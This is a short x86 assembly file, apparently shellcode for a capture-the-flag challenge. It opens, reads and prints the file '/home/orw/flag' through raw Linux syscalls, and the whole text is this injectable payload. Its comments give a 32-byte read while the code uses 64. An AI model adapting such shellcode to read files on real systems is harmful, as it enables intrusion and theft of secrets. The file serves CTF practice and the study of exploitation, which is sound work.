; fd = open("/home/orw/flag", O_RDONLY);
; n = read(fd, buf, sizeof(buf));
; write(1, buf, n);

global _start

section .text
_start:

	; open("/home/orw/flag", 0)
	xor eax, eax
	push eax
	push 0x67616c66        ; "flag"
	push 0x2f77726f        ; "orw/"
	push 0x2f656d6f        ; "ome/"
	push 0x682f2f2f        ; "///h"  (extra '/' are ignored)
	mov ebx, esp           ; ebx holds filename
	xor ecx, ecx           ; flags = 0
	xor edx, edx           ; O_RDONLY
	mov eax, 0x5           ; open syscall
	int 0x80               ; syscall

	; read(fd, buf, 32)
	mov ebx, eax           ; ebx = fd
	mov ecx, esp           ; ecx = buf on stack
	mov edx, 64            ; edx = 64 
	mov eax, 0x3           ; read syscall
	int 0x80               ; syscall

	; write(1, buf, 32);
	mov ebx, 0x1           ; ebx = 1
	mov edx, eax           ; edx = n
	mov ecx, esp           ; ecx = buf on stack
	mov eax, 0x4           ; write syscall
	int 0x80               ; syscall
